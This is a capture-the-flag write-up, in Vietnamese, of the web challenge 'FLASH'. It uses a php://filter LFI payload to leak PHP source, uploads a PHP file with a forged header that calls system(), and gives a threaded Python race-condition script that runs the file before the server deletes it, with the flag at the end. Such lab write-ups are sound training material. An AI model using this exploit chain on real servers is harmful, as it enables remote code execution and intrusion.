# FLASH

## Hint 

- Admin sign file bằng cách nào ?
- Không phải sqli .
- Không phải blackbox, LFI.
- Custom sign . 

## Solution

Bài này hơi lừa chút tại phần form đăng nhập , tuy nhiên mình sẽ đi thẳng vào vấn đề là khai thác lỗi LFI để lấy source code .

Ta sẽ có hai endpoint có thể truy cập được đó là ?page=checkFile và ?page=fakeFlag ta có thể LFi một trong hai cái này đều được.Do hint là không phải blackbox nên chắc chắn LFI là để lấy được source code .
Tại đây mình sẽ khai thác LFI để lấy source code của *checkFile* vì đây là hướng khai thác tiếp theo trong bài này. 

Payload: php://filter/convert.base64-encode/resource=checkFile

```
<!DOCTYPE html>
<html>
<body>

<form action="" method="post" enctype="multipart/form-data">
  Select file to check:
  <input type="file" name="files" id="fileToUpload">
  <input type="submit" value="Check" name="submit">
</form>

</body>
</html>

<?php
	function checkSign($handler){
		$header = fread($handler, 12);
		$type = substr($header, 0, 4);
		$size = unpack("n",substr($header, 4, 4));
		$signer = substr($header, 8, 4); 
		
		if($type!=="FILE" || $signer!=="CLWN"){
			return False;
		}else{
			return $size;
		}

	}

	function checkFile($file,$start,$size){
		// we still trying to collect more ... to deploy this 
	}

	if(isset($_FILES) && !empty($_FILES) ){
		//upload
		$fileName = hash("sha256",$_FILES["files"]["name"]);
		$uploadpath = "tmp/";
		$ext = pathinfo($_FILES["files"]["name"], PATHINFO_EXTENSION);
		$upload_dir = $uploadpath.$fileName.".".$ext;  
		

		//check
		$f = fopen($_FILES["files"]["tmp_name"],"rb");
		$fileSize = checkSign($f);
		fclose($f);
		if($fileSize[1] === 0){
			$error = "Empty file nothing to do";
		}elseif($fileSize[1] > 1024){
			$error = "File too large";
		}elseif(!$fileSize){
			$error = "Contact admin to sign your file before check btw he got something call FLAG ";
		}else{
			move_uploaded_file($_FILES["files"]["tmp_name"], $upload_dir);
			checkFile($upload_dir,12,$fileSize);
			unlink($upload_dir);
		}
		echo $error;
	}
	//
	
?>
```

Ok, nhìn vào source code có thể thấy một số vấn đề sau :
-  Đầu tiên, ta sẽ có hàm *checkSign* hàm này sẽ lấy ra 12 byte đầu trong file khi ta tải lên và nó sẽ chia ra là 3 phần với 4 byte đầu sẽ được so khớp với 'FILE', 4 byte tiếp theo dùng để tính filesize và byte cuối so khớp với 'CLWN' và hàm sẽ trae về filesize.
-  Tiếp theo là một hàm checkFile không có chức năng gì.
- Cuối cùng code sẽ check filesize của chúng ta nếu nó lớn hơn 1024 thì sẽ không up lên được . Và nếu các điều kiện được thỏa mãn ta sẽ có thể upload thành công tuy nhiên có một vấn đề là sau khi ta up file nên nó sẽ bị xóa ngay bằng unlink() => không thể tìm được file upload.

Hướng đi vẫn sẽ là upload lên payload để RCE do việc nó không có bất kì filter file nào nên ta có thể upload lên một payload bằng php có dạng :

```
FILExxxxCLWN

<?php
system('ls');
?> 

``` 

(Cái phần filesize ta có thể dùng hexeditor để sửa sao cho kích cỡ nhỏ hơn 1024 là được .)

Quay lại với vấn đề làm sao để có thể truy cập được file upload nên trước khi bị xóa , ta có thể để ý là trước khi unlink() thì code có chèn hàm checkFile() mặc dù nó không có tác dụng gì nhưng thiết nghĩ tác giả chắc không rảnh đến vậy. Mục đích ở đây chính là tạo thêm một độ trễ giữa việc upload lên và xóa file. Vậy ý tưởng ở đây sẽ là vừa upload file lên vừa truy cập vào file để rce (RACE_CONDITION).

```
move_uploaded_file($_FILES["files"]["tmp_name"], $upload_dir);
checkFile($upload_dir,12,$fileSize);
unlink($upload_dir);
```
File sẽ được di chuyển vào trong thư mục /tmp và tên file được encode bằng sha256.

Code exploit:
 
```
import threading 
import requests

def send():
    url = "http://172.21.0.2/?page=checkFile"
    while 1:
        with open("xx.php",'rb') as f:
            files = {"files": f}
            r = requests.post(url, files=files)
        t = requests.get("http://172.21.0.2/tmp/d9266e9e77e1b2bc988e5b6bd27b66949f40f1a8c612e3dbdb2383a3bc5043aa.php")
        if "FILE" in t.text:
            print(t.text) 
            break

if __name__ == '__main__':
    try:
        for _ in range(32):
            p1 = threading.Thread(target=send)
            p1.start()
        
    except Exception as e:
        print(e)

``` 

##Flag

KCSC{Không làm mà đòi có ăn à ?}


